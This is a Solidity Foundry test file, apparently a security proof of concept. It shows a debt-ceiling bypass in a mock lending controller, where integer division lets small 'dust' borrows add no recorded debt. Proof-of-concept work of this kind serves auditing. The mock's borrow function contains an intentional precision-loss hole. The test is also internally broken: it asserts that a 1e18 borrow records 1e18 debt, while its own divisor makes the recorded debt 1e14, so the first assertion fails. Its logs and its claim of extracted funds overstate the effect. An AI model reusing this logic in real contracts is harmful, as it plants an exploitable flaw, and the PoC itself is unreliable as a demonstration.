// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title LendingIsolationBypass Test
 * @notice Demonstrates debt ceiling bypass using small amounts (precision loss)
 * @dev Simplified standalone version of lending logic
 */
contract LendingIsolationBypassTest is Test {
    MockController controller;
    MockERC20 asset;
    
    address attacker = address(0x1);
    
    uint256 constant DEBT_CEILING = 1000e18; // Limit: 1000 units
    uint256 constant DIVISOR = 10000; // Normalization divisor (10^4)
    
    function setUp() public {
        asset = new MockERC20("RiskAsset", "RISK", 18);
        controller = new MockController(DEBT_CEILING, DIVISOR);
    }
    
    function testDebtCeilingBypassWithDust() public {
        // 1. Normal borrow should increase debt
        vm.startPrank(attacker);
        
        // Borrow 1 unit (1e18)
        controller.borrow(1e18);
        
        console.log("=== Normal Borrow ===");
        console.log("Borrowed: 1.0");
        console.log("Current Debt:", controller.currentDebt() / 1e18);
        assertEq(controller.currentDebt(), 1e18);
        
        // 2. Exploit: Dust borrows
        // Divisor is 10000. Any amount < 10000 results in 0 normalized debt increase
        uint256 dustAmount = 9999; 
        
        console.log("\n=== Dust Borrow Attack ===");
        console.log("Dust Amount:", dustAmount);
        console.log("Divisor:", DIVISOR);
        console.log("Expected increase: 0");
        
        // Execute 100 dust borrows
        uint256 startDebt = controller.currentDebt();
        for(uint i=0; i<100; i++) {
            controller.borrow(dustAmount);
        }
        
        uint256 endDebt = controller.currentDebt();
        uint256 totalBorrowed = controller.totalBorrowed();
        
        console.log("\n=== After 100 Dust Borrows ===");
        console.log("Recorded Debt:", endDebt / 1e18);
        console.log("Actual Borrowed (Tracked separately):", totalBorrowed);
        
        // Vulnerability: Debt did not increase
        assertEq(startDebt, endDebt, "VULNERABILITY: Debt did not increase!");
        
        // Attackers got funds
        assertGt(totalBorrowed, 1e18); 
        console.log("VULNERABILITY CONFIGMED: Borrowed assets without increasing recorded debt");
    }
}

contract MockController {
    uint256 public currentDebt;
    uint256 public debtCeiling;
    uint256 public divisor;
    
    uint256 public totalBorrowed; // Just for testing tracking
    
    constructor(uint256 _ceiling, uint256 _divisor) {
        debtCeiling = _ceiling;
        divisor = _divisor;
    }
    
    function borrow(uint256 amount) external {
        // Vulnerable Logic:
        // Calculate new debt using integer division
        
        // Logic from report:
        // _newDebt = currentDebt + (amount / divisor)
        uint256 normalizedIncrease = amount / divisor;
        uint256 newDebt = currentDebt + normalizedIncrease;
        
        // Check Ceiling
        require(newDebt <= debtCeiling, "Ceiling breached");
        
        // Update State
        currentDebt = newDebt;
        
        // Transfer assets (simulated)
        totalBorrowed += amount;
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    
    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
}
